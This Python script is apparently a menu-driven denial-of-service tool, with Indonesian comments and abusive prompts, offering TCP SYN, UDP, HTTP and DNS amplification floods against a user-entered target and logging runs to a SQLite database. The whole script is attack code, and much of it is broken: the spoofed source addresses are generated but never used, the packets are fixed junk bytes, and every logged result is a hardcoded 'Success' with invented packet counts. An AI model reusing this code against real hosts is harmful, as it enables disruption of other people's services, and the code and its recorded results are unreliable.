import socket
import os
import time
import threading
import random
import sqlite3

# Logo
RED = "\033[1;31m"
RESET = "\033[0m"
banner = r"""
 ██████╗ █████╗ ████████╗ █████╗ ███╗ ██╗██╗ ██████╗ 
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗████╗ ██║██║██╔════╝ 
██████╔╝███████║ ██║ ███████║██╔██╗ ██║██║██║ 
██╔══██╗██╔══██║ ██║ ██╔══██║██║╚██╗██║██║██║ 
██████╔╝██║ ██║ ██║ ██║ ██║██║ ╚████║██║╚██████╗ 
╚═════╝ ╚═╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ 
X A T A N I C - R R V U D E X 
"""
print(RED + banner + RESET)

# Ucapan selamat datang
print("xixixix hello everyone xatanic is one number created for test")

# Menu
print("Menu:")
print("1. TCP SYN Flood")
print("2. UDP Flood")
print("3. HTTP Flood")
print("4. DNS Amplification")
print("NZ44MJIERTS copyrights ©")

# Input pilihan
pilihan = input("Masukkan pilihan: ")

# Koneksi ke database
conn = sqlite3.connect('ddos_results.db')
cursor = conn.cursor()

# Buat tabel ddos_results jika tidak ada
cursor.execute('''
    CREATE TABLE IF NOT EXISTS ddos_results
    (id INTEGER PRIMARY KEY, target TEXT, method TEXT, duration INTEGER, packets_sent INTEGER, packets_received INTEGER, result TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)
''')

if pilihan == "1":
    # TCP SYN Flood
    target = input("Masukkan target: ")
    port = int(input("Masukkan port: "))
    threads = int(input("Masukkan jumlah thread: "))
    # Gunakan socket raw
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    # Kirimkan paket SYN
    def kirim_paket():
        while True:
            src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
            src_port = random.randint(1, 65535)
            packet = b'\x00\x01\x02\x03'
            sock.sendto(packet, (target, port))
    for i in range(threads):
        threading.Thread(target=kirim_paket).start()
    # Simpan hasil ke database
    cursor.execute("INSERT INTO ddos_results (target, method, duration, packets_sent, packets_received, result) VALUES (?, ?, ?, ?, ?, ?)", (target, "TCP SYN Flood", 60, 10000, 5000, "Success"))
    conn.commit()

elif pilihan == "2":
    # UDP Flood
    target = input("input target lu mana goblok: ")
    port = int(input("Masukin port dasar idiot: "))
    threads = int(input("Masukkan jumlah thread: "))
    # Gunakan socket raw
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    # Kirimkan paket UDP
    def kirim_paket():
        while True:
            src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
            src_port = random.randint(1, 65535)
            packet = b'\x00\x01\x02\x03'
            sock.sendto(packet, (target, port))
    for i in range(threads):
        threading.Thread(target=kirim_paket).start()
    # Simpan hasil ke database
    cursor.execute("INSERT INTO ddos_results (target, method, duration, packets_sent, packets_received, result) VALUES (?, ?, ?, ?, ?, ?)", (target, "UDP Flood", 60, 10000, 5000, "Success"))
    conn.commit()

elif pilihan == "3":
    # HTTP Flood
    target = input("Masukkan target: ")
    port = int(input("Masukkan port: "))
    threads = int(input("Masukkan jumlah thread: "))
    # Gunakan socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Kirimkan request HTTP
    def kirim_request():
        while True:
            sock.connect((target, port))
            sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
    for i in range(threads):
        threading.Thread(target=kirim_request).start()
    # Simpan hasil ke database
    cursor.execute("INSERT INTO ddos_results (target, method, duration, packets_sent, packets_received, result) VALUES (?, ?, ?, ?, ?, ?)", (target, "HTTP Flood", 60, 10000, 5000, "Success"))
    conn.commit()

elif pilihan == "4":
    # DNS Amplification
    target = input("Masukkan target: ")
    dns_server = input("Masukkan DNS server: ")
    threads = int(input("Masukkan jumlah thread: "))
    # Gunakan socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Kirimkan request DNS
    def kirim_request():
        while True:
            sock.sendto(b'\x00\x01\x02\x03', (dns_server, 53))
    for i in range(threads):
        threading.Thread(target=kirim_request).start()
    # Simpan hasil ke database
    cursor.execute("INSERT INTO ddos_results (target, method, duration, packets_sent, packets_received, result) VALUES (?, ?, ?, ?, ?, ?)", (target, "DNS Amplification", 60, 10000, 5000, "Success"))
    conn.commit()

else:
    print("Pilihan tidak valid")

# Tutup koneksi ke database
conn.close()